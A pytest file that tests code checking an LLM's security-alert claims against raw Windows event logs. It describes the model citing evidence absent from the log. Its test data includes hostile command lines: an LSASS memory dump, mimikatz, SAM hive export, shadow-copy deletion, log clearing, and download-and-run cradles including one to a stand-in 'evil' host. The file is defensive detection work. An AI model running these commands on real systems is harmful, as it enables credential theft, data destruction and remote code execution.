"""The model proposes a criterion; the log decides whether it holds.

Three prompt versions oscillated between two failure modes and no wording
fixed both:

    v2  escalated routine telemetry, pasting criterion text into the summary
    v3  described events correctly and never returned CRITICAL at all
    v4  returns CRITICAL, and claims criteria that are not in the log

The v4 case is the clearest. Shown an EID 4672 SYSTEM logon - a list of
privilege names, nothing else - the model answered "C1 credential access -
comsvcs.dll". There is no comsvcs.dll in that event. It had learned the shape
of the answer rather than checking.

Whether a string is in a log is not a judgement call, so it stopped being the
model's job. These tests need no model, which is the point of moving the
decision into code.
"""
from __future__ import annotations

import json
import types

import pytest

from ai import criteria


def v(observed="", claimed="none", verdict="NOT_CRITICAL", severity="INFO"):
    return types.SimpleNamespace(observed=observed, matched_criterion=claimed,
                                 verdict=verdict, severity=severity)


# --------------------------------------------------------------------------
# The claim that started this
# --------------------------------------------------------------------------

def test_an_unsupported_claim_is_refused():
    """The exact output the model produced on EID 4672."""
    verdict = v(observed="SeAssignPrimaryTokenPrivilege SeTcbPrivilege SeDebugPrivilege",
                claimed="C1 credential access - comsvcs.dll",
                verdict="CRITICAL", severity="CRITICAL")
    note = criteria.apply(verdict, "EID=4672 | S-1-5-18 | SYSTEM | NT AUTHORITY")
    assert verdict.verdict == "NOT_CRITICAL"
    assert note and "none of its markers" in note


def test_a_refused_claim_loses_its_basis_entirely():
    """This dropped to SUSPICIOUS at first, reasoning that the model thought
    *something*. The data refused that: v4 claims a criterion on nearly every
    event, so downgrading to SUSPICIOUS escalated eight of nine benign cases -
    an EID 4672 SYSTEM logon among them.

    The prompt says the verdict follows from the criterion. A reason that is
    false is not a weaker reason; it is no reason.
    """
    verdict = v(claimed="C1", verdict="CRITICAL", severity="CRITICAL")
    criteria.apply(verdict, "nothing relevant here")
    assert verdict.verdict == "NOT_CRITICAL"
    assert verdict.severity == "INFO"


def test_a_supported_claim_is_upheld():
    """The evidence has to be in the log, not in the model's own field - see
    test_the_model_cannot_manufacture_its_own_evidence."""
    verdict = v(observed="rundll32.exe comsvcs.dll, MiniDump 704 lsass.dmp full",
                claimed="C1 credential access", verdict="CRITICAL", severity="CRITICAL")
    log = "CommandLine=rundll32.exe comsvcs.dll, MiniDump 704 lsass.dmp full"
    assert criteria.apply(verdict, log) is None
    assert verdict.verdict == "CRITICAL"


# --------------------------------------------------------------------------
# The log decides which criterion, not only whether
# --------------------------------------------------------------------------

def test_a_misfiled_criterion_is_corrected_not_discarded():
    """On `vssadmin delete shadows` the model claimed C3, evidence
    destruction. The log supports C6. Verifying only the claim would have
    thrown away a real detection because the model filed it wrong."""
    verdict = v(observed="vssadmin.exe delete shadows /all /quiet",
                claimed="C3 evidence destruction", verdict="CRITICAL")
    note = criteria.apply(verdict, "CommandLine=vssadmin.exe delete shadows /all /quiet")
    assert verdict.verdict == "CRITICAL"
    assert "C6" in verdict.matched_criterion
    assert note and "C6" in note


def test_a_criterion_the_model_missed_is_found():
    """It claimed none on a service installed from ADMIN$."""
    verdict = v(observed="service installed from a remote share",
                claimed="none", verdict="SUSPICIOUS")
    criteria.apply(verdict, r"ImagePath=\\10.20.30.41\ADMIN$\mtHKzQrx.exe")
    assert verdict.verdict == "CRITICAL"
    assert "C2" in verdict.matched_criterion


def test_the_raw_log_is_searched_as_well_as_the_observation():
    """`observed` is 180 characters and can legitimately omit a marker."""
    verdict = v(observed="a new process was created", claimed="none")
    criteria.apply(verdict, "CommandLine=vssadmin.exe delete shadows /all /quiet")
    assert verdict.verdict == "CRITICAL"


# --------------------------------------------------------------------------
# Benign events must stay benign
# --------------------------------------------------------------------------

@pytest.mark.parametrize("log", [
    "EID=4672 | S-1-5-18 | SYSTEM | SeDebugPrivilege SeBackupPrivilege",
    "EID=4798 | group membership was enumerated | bash.exe",
    "EID=7040 | start type of the BITS service was changed",
    "EID=4624 | LogonType=5 | services.exe",
])
def test_the_observed_false_positives_match_nothing(log):
    verdict = v(observed=log, claimed="none")
    criteria.apply(verdict, log)
    assert verdict.verdict != "CRITICAL", log


def test_a_privilege_name_is_not_credential_access():
    """SeDebugPrivilege appearing in a log is not evidence of dumping."""
    assert not criteria.supported_by("C1", "SeDebugPrivilege SeTcbPrivilege")


def test_the_word_credential_alone_matches_nothing():
    for tag in criteria.CRITERIA:
        assert not criteria.supported_by(tag, "Logon with explicit credentials")


# --------------------------------------------------------------------------
# Mechanics
# --------------------------------------------------------------------------

@pytest.mark.parametrize("text,expected", [
    ("C1 credential access - comsvcs.dll", "C1"),
    ("c6", "C6"),
    ("matched C3 evidence destruction", "C3"),
    ("none", None),
    ("", None),
    ("C9 something invented", None),
])
def test_the_tag_is_extracted_from_free_text(text, expected):
    """The field is prose - the model writes the name alongside the number."""
    assert criteria.claimed_criterion(text) == expected


def test_every_marker_of_an_alternative_is_required():
    """`reg save HKLM\\SAM` is C1; the word `reg` on its own is not."""
    assert criteria.supported_by("C1", r"reg save HKLM\SAM C:\out.hive")
    assert not criteria.supported_by("C1", r"reg query HKLM\Software")


def test_all_six_criteria_are_reachable():
    """A criterion with no working marker is a detection that can never fire,
    and nothing else would report it."""
    samples = {
        "C1": "comsvcs.dll MiniDump",
        "C2": "wmic /node:10.0.0.5 process call create",
        "C3": "EID=1102 audit log was cleared",
        "C4": r"schtasks /create /tn Updater /tr C:\Users\Public\payload.exe",
        "C5": "powershell -EncodedCommand x DownloadString('http://h/a')",
        "C6": "vssadmin delete shadows /all",
    }
    for tag, sample in samples.items():
        assert criteria.supported_by(tag, sample), tag


def test_no_claim_and_no_support_changes_nothing():
    verdict = v(observed="a routine event", claimed="none", verdict="NOT_CRITICAL")
    assert criteria.apply(verdict, "a routine event") is None
    assert verdict.verdict == "NOT_CRITICAL"


def test_a_supported_criterion_raises_severity_to_at_least_high():
    """The gate needs CRITICAL/HIGH before a CRITICAL verdict surfaces, so
    leaving severity at MEDIUM would file a real detection quietly."""
    verdict = v(observed="mimikatz sekurlsa::logonpasswords", claimed="C1",
                verdict="SUSPICIOUS", severity="MEDIUM")
    criteria.apply(verdict, "CommandLine=mimikatz.exe sekurlsa::logonpasswords")
    assert verdict.severity in ("CRITICAL", "HIGH")


def test_both_callers_use_it():
    """The worker that files the row and the eval that scores the model. They
    drifted apart once already, and the harness reported 40% escalation recall
    on runs where production surfaced nothing."""
    import pathlib
    root = pathlib.Path(__file__).resolve().parent.parent
    for f in ("ai_worker.py", "scripts/run_eval.py"):
        src = (root / f).read_text(encoding="utf-8")
        assert "criteria.apply(" in src, f


# --------------------------------------------------------------------------
# What these markers do and do not demonstrate
# --------------------------------------------------------------------------

# Corpus positives the six criteria do not cover, each with the reason. This
# list is the point of the three tests below: it is short, it is argued, and
# adding to it is a decision somebody has to write down rather than a test
# quietly going green.
#
# The corpus outgrew this file. It began as eight cases built alongside these
# markers and is now also what proves every Sigma rule fires, so it grows every
# time a rule is added - and "every corpus positive must match a marker" then
# reads as "every new rule needs a marker beside it". That is the wrong
# direction. A marker forces CRITICAL and skips the confidence gate, so the bar
# is evidence that is hard to produce by accident, not evidence that a
# technique was used.
OUTSIDE_THE_CRITERIA = {
    "constructed:t1560-archive-staged":
        "Collection. `rar a -hp` in Temp is a strong signal and `rar a` is a "
        "backup job; separating them needs the location and the parent, which "
        "is rule work.",
    "constructed:t1115-clipboard-capture":
        "Collection. `Get-Clipboard` is a documented cmdlet with ordinary "
        "uses; the loop and the hidden window are what make it theft.",
    "constructed:t1567-web-upload":
        "Exfiltration. `Invoke-RestMethod -Method Post` is how half of this "
        "estate's own automation talks to its own APIs. The destination is "
        "what separates them and this cannot know which hosts are ours.",
    "constructed:t1087-domain-recon":
        "Discovery. `net group \"Domain Admins\"` is the first thing an "
        "administrator types and the first thing an intruder types.",
    "constructed:t1136-local-admin-added":
        "Account creation. The helpdesk does this all morning.",
    "constructed:t1566-office-spawns-shell":
        "The evidence is a parent-child relationship, not a string. WINWORD "
        "spawning cmd is damning and neither name is suspicious alone.",
    "constructed:t1546-wmi-subscription":
        "Fileless persistence. `__EventFilter` in `root\\subscription` looks "
        "specific until you remember ConfigMgr is built on WMI subscriptions.",
    "constructed:t1563-rdp-session-hijack":
        "`tscon /dest:` takes over another user's session. Rare, but it is "
        "also how an administrator reconnects a hung session, and there is no "
        "second string that says which happened.",
}


def _corpus_rows():
    import pathlib

    corpus = (pathlib.Path(__file__).resolve().parent.parent
              / "evals" / "corpus_attacks.jsonl")
    return [json.loads(l) for l
            in corpus.read_text(encoding="utf-8").splitlines() if l.strip()]


def _matches_any_criterion(row) -> bool:
    return any(criteria.supported_by(tag, json.dumps(row["event"]))
               for tag in criteria.CRITERIA)


def test_the_markers_cover_every_attack_they_claim_to():
    """Everything the criteria are meant to catch, minus what is argued out
    above.

    The number this produces proves less than it looks: the markers and most
    of the corpus positives were written by the same person from the same list
    of techniques, so matching them is close to circular. The half that is
    evidence is the negatives - four of them are events this deployment
    actually produced, and none was in view when the markers were written.
    `test_the_observed_false_positives_match_nothing` is the test that carries
    weight.

    What this one is still good for is the day a marker stops matching. Three
    did, silently: "the audit log was cleared" and "a service was installed"
    are message templates, and the collector ships StringInserts.
    """
    positives = [r for r in _corpus_rows() if r["expected"] == "CRITICAL"]
    assert positives, "the corpus has no positives"

    in_scope = [r for r in positives if r["id"] not in OUTSIDE_THE_CRITERIA]
    missing = [r["id"] for r in in_scope if not _matches_any_criterion(r)]
    assert not missing, (
        "attacks with no marker: " + ", ".join(missing) + ". Either add the "
        "marker or add the case to OUTSIDE_THE_CRITERIA with the reason."
    )


def test_the_uncovered_attacks_are_a_decision_and_not_an_oversight():
    """Both directions, because the list rots either way.

    An id that leaves the corpus leaves a stale excuse behind. And an entry
    that starts matching means a marker widened until it covers a case
    somebody argued should stay out - which is how `appdata` got back in,
    written longer.
    """
    rows = {r["id"]: r for r in _corpus_rows()}
    stale = sorted(set(OUTSIDE_THE_CRITERIA) - set(rows))
    assert not stale, f"no longer in the corpus: {stale}"

    now_matching = sorted(i for i in OUTSIDE_THE_CRITERIA
                          if _matches_any_criterion(rows[i]))
    assert not now_matching, (
        f"markers now cover cases argued out: {now_matching}. If that is "
        f"deliberate, delete the entry; if not, the marker is too wide."
    )


def test_nothing_argued_out_of_the_criteria_falls_through_the_rules_too():
    """The reason the list above is acceptable.

    Each of those cases is left to the Sigma rules, which can score and be
    tuned rather than forcing CRITICAL. That is only true while a rule
    actually fires on it - otherwise "the rules handle it" is an assumption,
    and the case is covered by nothing at all.
    """
    from core.sigma_loader import load_dir, match_all

    from tests.test_sigma_builtin_rules import RULES_DIR, _as_event, _message

    rules = load_dir(RULES_DIR).rules
    rows = {r["id"]: r for r in _corpus_rows()}
    unwatched = sorted(i for i in OUTSIDE_THE_CRITERIA
                       if not match_all(rules, _as_event(_message(rows[i]))))
    assert not unwatched, (
        f"no criterion and no rule: {unwatched}. Nothing sees these."
    )


def test_no_case_below_critical_is_forced_to_critical():
    """`apply()` promotes a supported criterion to CRITICAL, so a marker that
    reaches a case the corpus grades SUSPICIOUS makes it unscoreable - the
    eval compares against `expected` exactly, and no answer from the model can
    win.

    The other benign test looks at NOT_CRITICAL rows only, which left the two
    SUSPICIOUS ones unwatched. A Run key into AppData sat there being forced
    to CRITICAL by a marker whose own comment said it had been removed.
    """
    for row in _corpus_rows():
        if row["expected"] == "CRITICAL":
            continue
        verdict = v(claimed="none", verdict=row["expected"])
        criteria.apply(verdict, json.dumps(row["event"]))
        assert verdict.verdict != "CRITICAL", (
            f"{row['id']} is graded {row['expected']} and a criterion forces "
            f"it to CRITICAL"
        )


def test_no_benign_case_matches_a_marker():
    """The number that is not circular. Four of these are observed events."""
    import json
    import pathlib

    corpus = (pathlib.Path(__file__).resolve().parent.parent
              / "evals" / "corpus_attacks.jsonl")
    rows = [json.loads(l) for l in corpus.read_text(encoding="utf-8").splitlines()
            if l.strip()]
    escalated = [r["id"] for r in rows if r["expected"] == "NOT_CRITICAL"
                 and any(criteria.supported_by(tag, json.dumps(r["event"]))
                         for tag in criteria.CRITERIA)]
    assert not escalated, f"markers fire on benign events: {escalated}"


def test_json_escaping_does_not_hide_a_path():
    r"""The event's `message` is itself a JSON string, so serialising the
    event escapes its backslashes twice and `HKLM\SAM` arrives as four. Both
    `reg save HKLM\SAM` and `C:\Users\Public\svchost.exe` were missed for
    exactly this - the markers were right and the text was a different
    encoding of the same string."""
    import json
    event = {"message": json.dumps({"message": r"reg.exe save HKLM\SAM C:\out.hive"})}
    assert criteria.supported_by("C1", json.dumps(event))


def test_forward_slashes_are_folded():
    """The same path is written both ways depending on the producer."""
    assert criteria.supported_by(
        "C4", "schtasks /create /tr C:/Users/Public/payload.exe")


def test_critical_with_no_basis_at_all_is_downgraded():
    """The prompt makes a criterion the requirement for CRITICAL, so a
    CRITICAL that claims nothing and matches nothing has no stated basis and
    no findable one. A network logon by the backup service came back that way.

    SUSPICIOUS rather than NOT_CRITICAL, unlike a refuted claim: there the
    model gave a reason and the reason was false; here it gave none, and "I
    cannot say why" is weaker evidence than a disproved claim, not stronger.
    """
    verdict = v(observed="network logon by svc_backup from CORP-BKP01",
                claimed="none", verdict="CRITICAL", severity="CRITICAL")
    criteria.apply(verdict, r"EID=4624 LogonType=3 Account=CORP\svc_backup")
    assert verdict.verdict == "SUSPICIOUS"
    assert verdict.severity != "CRITICAL"


def test_a_refuted_claim_falls_further_than_an_absent_one():
    """The two downgrade paths are deliberately different depths."""
    refuted = v(observed="SeDebugPrivilege", claimed="C1", verdict="CRITICAL",
                severity="CRITICAL")
    absent = v(observed="SeDebugPrivilege", claimed="none", verdict="CRITICAL",
               severity="CRITICAL")
    criteria.apply(refuted, "EID=4672 SeDebugPrivilege")
    criteria.apply(absent, "EID=4672 SeDebugPrivilege")
    assert refuted.verdict == "NOT_CRITICAL"
    assert absent.verdict == "SUSPICIOUS"


def test_a_supported_criterion_is_not_touched_by_either_path():
    verdict = v(observed="vssadmin delete shadows /all", claimed="none",
                verdict="NOT_CRITICAL", severity="INFO")
    criteria.apply(verdict, "CommandLine=vssadmin delete shadows /all")
    assert verdict.verdict == "CRITICAL"
    assert verdict.severity in ("CRITICAL", "HIGH")


def test_a_run_key_into_appdata_is_not_forced_to_critical():
    """`appdata` was a C4 marker on its own. Slack, Teams and Dropbox each
    install a Run key pointing into AppData, so every one of them matched
    persistence-to-a-writable-path and came out CRITICAL.

    Removing it cost nothing measurable - all eight attack cases still match a
    criterion - and a Run key into AppData is still worth a look. That is a
    judgement, which is the model's half of this.

    It was not removed. `currentversion\\run` + `\\appdata\\` survived as a
    pair, which is the same alternative written longer, and this test did not
    notice because its sample elides the key path as `HKLM\\...\\Run` - so the
    first marker was missing and the assertion passed for the wrong reason.
    The full path below is what Sysmon EID 13 writes, and it is the corpus
    case `constructed:t1547-run-key`, graded SUSPICIOUS.
    """
    key = (r"TargetObject=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion"
           r"\Run\Updater | Details=C:\Users\jdoe\AppData\Roaming\updater.exe")
    assert not criteria.supported_by("C4", key)


def test_the_markers_match_what_the_agent_ships_not_what_event_viewer_renders():
    """Three markers here could never have fired in production.

    "The audit log was cleared" and "A service was installed in the system"
    are message *templates*. Windows stores the fields and renders the
    sentence when something asks it to; the collector joins `StringInserts`
    with " | " and never asks. For 1102 those inserts are four fields naming
    the account, and for 7045 they are the service name, image path, type,
    start type and account. No prose in either.

    So C3 matched clearing the audit log only in hand-written corpus lines,
    and C4's service branch the same. Both events have their own Sigma rule
    keyed on the event id, which is why nobody noticed - one layer covered it
    and the other reported coverage it did not have.

    These two strings are the real shape, and neither contains the sentence.
    """
    cleared = ("[Security] EID=1102, Cat=13568 | "
               r"S-1-5-21-1111111111-2222222222-3333333333-1001 | jdoe | "
               "CORP | 0x3e7")
    assert "cleared" not in cleared.lower(), "the sentence is not in the event"
    assert criteria.supported_by("C3", cleared)

    installed = ("[System] EID=7045, Cat=0 | WinHelpSvc | "
                 r"C:\Windows\Temp\svc.exe | user mode service | "
                 "auto start | LocalSystem")
    assert "installed" not in installed.lower(), "nor in this one"
    assert criteria.supported_by("C4", installed)


def test_a_service_from_a_normal_location_is_still_not_persistence():
    """The 7045 pairing is unchanged by the format fix: the event id alone is
    not the evidence. Software arrives on a managed estate as a service
    installed from the distribution point, and that is the benign corpus
    case."""
    ordinary = ("[System] EID=7045, Cat=0 | NinjaRMMAgent | "
                r"\\corp-sccm01\SoftwareDist$\NinjaRMMAgent.exe | "
                "user mode service | auto start | LocalSystem")
    assert not criteria.supported_by("C4", ordinary)


def test_log_rotation_is_not_log_clearing():
    """`wevtutil` is both. The nightly job archives the Application log and
    this deployment produced one; ` cl ` is the subcommand that destroys."""
    assert not criteria.supported_by(
        "C3", r"CommandLine=wevtutil.exe archive-log C:\Logs\App.evtx")
    assert criteria.supported_by("C3", "CommandLine=wevtutil.exe cl Security")


def test_a_writable_path_needs_a_mechanism_beside_it():
    """A path is a location. Persistence is something that will run again, and
    this criterion used to accept the first as evidence of the second.

    Windows Error Reporting writes its crash dumps under
    `C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\`, which matched both
    `programdata` and `\\temp\\`. Three of the ten real events in the corpus
    were being forced to CRITICAL by a desktop reporting that something had
    crashed - and a forced criterion bypasses the confidence gate, so each one
    went to an analyst.
    """
    for path in (r"C:\Users\Public\svchost.exe",
                 r"C:\Windows\Temp\payload.exe",
                 r"C:\ProgramData\x.exe"):
        assert not criteria.supported_by("C4", path), path

    for mechanism in (r"schtasks /create /tr C:\Users\Public\svchost.exe",
                      r"HKLM\Software\...\CurrentVersion\Run\x = C:\Windows\Temp\p.exe",
                      r"A service was installed ImagePath=C:\Users\Public\s.exe"):
        assert criteria.supported_by("C4", mechanism), mechanism


def test_a_crash_dump_is_not_persistence():
    """The observed event that made the point, kept close to verbatim."""
    wer = (r"[Windows Error Reporting] EID=1001 | LiveKernelEvent | "
           r"\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER.cf3a2b91.tmp.xml")
    assert not criteria.supported_by("C4", wer)


def test_the_model_cannot_manufacture_its_own_evidence():
    """`observed` was in the haystack at first, on the reasoning that the log
    might be truncated. That is backwards: `observed` is derived from the log
    and can hold nothing the log does not, so including it meant the model
    could write "comsvcs.dll" into a field and have the check confirm that
    "comsvcs.dll" appears.

    It is what let CRITICAL survive on a backup service's network logon.
    """
    verdict = v(observed="rundll32 comsvcs.dll MiniDump lsass.dmp",
                claimed="C1", verdict="CRITICAL", severity="CRITICAL")
    criteria.apply(verdict, r"EID=4624 LogonType=3 Account=CORP\svc_backup")
    assert verdict.verdict != "CRITICAL", (
        "the model's own text validated its claim"
    )


def test_a_real_marker_in_the_log_still_matches_without_observed():
    verdict = v(observed="", claimed="none", verdict="NOT_CRITICAL")
    criteria.apply(verdict, "CommandLine=rundll32 comsvcs.dll, MiniDump 704 x.dmp")
    assert verdict.verdict == "CRITICAL"


# --------------------------------------------------------------------------
# Reading the payload rather than the wrapper
# --------------------------------------------------------------------------

def _enc(script: str) -> str:
    """A PowerShell -EncodedCommand, encoded the way PowerShell encodes it."""
    import base64
    return "powershell.exe -nop -w hidden -enc " + base64.b64encode(
        script.encode("utf-16-le")).decode()


def test_encoding_alone_is_not_the_indicator():
    """This estate's own management tooling ran an encoded command on an
    ordinary afternoon, and the criterion forced it to CRITICAL - which then
    bypasses the confidence gate and reaches an analyst.

    A developer decoding a config string is the same shape. Both are in the
    corpus, and the flag cannot tell them apart because the flag is not what
    differs.
    """
    assert not criteria.supported_by("C5", _enc("Get-Date; Write-Host hello"))
    assert not criteria.supported_by(
        "C5", "[Convert]::FromBase64String($env:APP_CONFIG)")


def test_a_cradle_inside_the_payload_is_found():
    """What actually separates the two: one of them fetches and runs remote
    code. That is only visible after decoding, which is the entire reason
    -EncodedCommand is used."""
    assert criteria.supported_by(
        "C5", _enc("IEX (New-Object Net.WebClient).DownloadString('http://h/a.ps1')"))


def test_the_decoder_ignores_things_that_merely_look_like_base64():
    """GUIDs, hashes and hex dumps fill these logs. Decoding them yields
    mojibake, and mojibake in the haystack can coincide with a marker."""
    noise = ("22feb12c-e7ce-4ccb-8f8b-f10fa2f43e90 ffffe68b1db70370 "
             "fffff8053b00b6a0 " + "a1b2c3d4" * 12)
    decoded = criteria.decoded_payload(noise)
    assert "downloadstring" not in decoded.lower()


def test_the_decoder_is_bounded():
    """A log line can be very long and this runs on every event."""
    import base64
    blob = base64.b64encode(b"DownloadString http://x " * 4).decode()
    assert criteria.decoded_payload(" ".join([blob] * 200))


def test_utf8_payloads_decode_too():
    """PowerShell is UTF-16LE; everything on Linux is not."""
    import base64
    blob = base64.b64encode(b"curl http://evil/x | sh").decode() + "AAAA"
    assert "curl" in criteria.decoded_payload(blob)
